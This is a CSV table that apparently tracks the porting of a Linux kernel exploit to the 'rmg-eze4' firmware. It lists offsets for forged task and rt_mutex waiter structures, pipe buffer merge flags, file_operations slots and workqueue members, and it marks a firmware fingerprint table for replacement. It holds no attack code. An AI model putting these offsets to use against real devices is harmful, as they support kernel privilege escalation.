"FOPS_OFF","0x7000","0x7000","PAYLOAD_SYNTHETIC_LAYOUT","Payload-owned layout/algorithm constant; independent of firmware binary layout","CONFIRMED_IDENTICAL","KEEP"
"SCRATCH_OFF","0x3000","0x3000","PAYLOAD_SYNTHETIC_LAYOUT","Payload-owned layout/algorithm constant; independent of firmware binary layout","CONFIRMED_IDENTICAL","KEEP"
"RIGHT_OFF","0x4440","0x4440","PAYLOAD_SYNTHETIC_LAYOUT","Payload-owned layout/algorithm constant; independent of firmware binary layout","CONFIRMED_IDENTICAL","KEEP"
"LEFT_OFF","0x5550","0x5550","PAYLOAD_SYNTHETIC_LAYOUT","Payload-owned layout/algorithm constant; independent of firmware binary layout","CONFIRMED_IDENTICAL","KEEP"
"FAKE_TASK_OFF","0x3200","0x3200","PAYLOAD_SYNTHETIC_LAYOUT","Payload-owned layout/algorithm constant; independent of firmware binary layout","CONFIRMED_IDENTICAL","KEEP"
"FAKE_WAITER_PI_TREE_ENTRY_OFF","0x18","0x18","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"FAKE_WAITER_TASK_OFF","0x30","0x30","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"FAKE_WAITER_LOCK_OFF","0x38","0x38","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"FAKE_WAITER_WAKE_STATE_OFF","0x40","0x40","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"FAKE_WAITER_PRIO_OFF","0x44","0x44","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"FAKE_WAITER_DEADLINE_OFF","0x48","0x48","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"FAKE_WAITER_WW_CTX_OFF","0x50","0x50","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"FAKE_TASK_USAGE_OFF","0x38","0x38","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"FAKE_TASK_PRIO_OFF","0x7c","0x7c","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"FAKE_TASK_NORMAL_PRIO_OFF","0x84","0x84","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"FAKE_TASK_PI_LOCK_OFF","0x884","0x884","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"FAKE_TASK_PI_WAITERS_OFF","0x898","0x898","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"FAKE_TASK_PI_TOP_TASK_OFF","0x8a8","0x8a8","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"FAKE_TASK_PI_BLOCKED_ON_OFF","0x8b0","0x8b0","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"CFG_PAGE_OFF","16","16","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"CFG_NEEDS_READ_FILL_OFF","80","80","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"CFG_BIN_BUFFER_OFF","88","88","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"CFG_BIN_BUFFER_SIZE_OFF","96","96","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"CFG_CB_MAX_SIZE_OFF","100","100","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"WQ_DFL_PWQ_OFF","0xb0","0xb0","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"PWQ_POOL_OFF","0x00","0x00","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"PWQ_WQ_OFF","0x08","0x08","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"PWQ_WORK_COLOR_OFF","0x10","0x10","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"PWQ_REFCNT_OFF","0x18","0x18","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"PWQ_NR_IN_FLIGHT_OFF","0x1c","0x1c","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"PWQ_NR_ACTIVE_OFF","0x5c","0x5c","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"PWQ_MAX_ACTIVE_OFF","0x60","0x60","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"POOL_WORKLIST_OFF","0x20","0x20","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"POOL_NR_IDLE_OFF","0x34","0x34","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"WORK_DATA_OFF","0x00","0x00","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"WORK_ENTRY_OFF","0x08","0x08","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"WORK_FUNC_OFF","0x18","0x18","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"STRUCT_PAGE_SIZE","0x40","0x40","KERNEL_STRUCT_SIZE","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"STRUCT_PAGE_COMPOUND_HEAD_OFF","0x08","0x08","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"STRUCT_SLAB_CACHE_OFF","0x18","0x18","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"STRUCT_PAGE_TYPE_OFF","0x30","0x30","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"PIPE_BUFFER_SLOTS","32","32","EXPLOIT_ALGORITHM_CONSTANT","Payload-owned layout/algorithm constant; independent of firmware binary layout","CONFIRMED_IDENTICAL","KEEP"
"PIPE_BUF_FLAG_CAN_MERGE","0x10","0x10","EXPLOIT_ALGORITHM_CONSTANT","Payload-owned layout/algorithm constant; independent of firmware binary layout","CONFIRMED_IDENTICAL","KEEP"
"FOPS_OWNER_OFF","0x00","0x00","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"FOPS_LLSEEK_OFF","0x08","0x08","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"FOPS_READ_OFF","0x10","0x10","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"FOPS_WRITE_OFF","0x18","0x18","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"FOPS_READ_ITER_OFF","0x20","0x20","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"FOPS_WRITE_ITER_OFF","0x28","0x28","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"FOPS_IOCTL_OFF","0x50","0x50","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"FOPS_COMPAT_IOCTL_OFF","0x58","0x58","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"FOPS_MMAP_OFF","0x60","0x60","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"FOPS_OPEN_OFF","0x70","0x70","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"FOPS_RELEASE_OFF","0x80","0x80","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"FOPS_SPLICE_READ_OFF","0xc8","0xc8","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"FOPS_SHOW_FDINFO_OFF","0xe0","0xe0","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"P0_FINGERPRINT_H","","N/A","UNKNOWN","C include guard; not a target parameter","NOT_APPLICABLE","REMOVE"
"P0_FINGERPRINT_WORDS","8","8","EXPLOIT_ALGORITHM_CONSTANT","Payload-owned layout/algorithm constant; independent of firmware binary layout","CONFIRMED_IDENTICAL","KEEP"
"p0_fingerprint_offsets","{ 0x000, 0x200, 0x400, 0x600, 0x800, 0xa00, 0xc00, 0xe00 }","{ 0x000, 0x200, 0x400, 0x600, 0x800, 0xa00, 0xc00, 0xe00 }","EXPLOIT_ALGORITHM_CONSTANT","Payload-owned layout/algorithm constant; independent of firmware binary layout","CONFIRMED_IDENTICAL","KEEP"
"p0_fingerprints","struct p0_fingerprint array [32 entries]","struct p0_fingerprint array [125 entries]","FIRMWARE_FINGERPRINT","docs/rmg-eze4/eze4_p0_fingerprint_table.csv; p0_fingerprint_EZE4.generated.h; 1000/1000 words rederived from Image.stock","CONFIRMED_CHANGED","REPLACE"
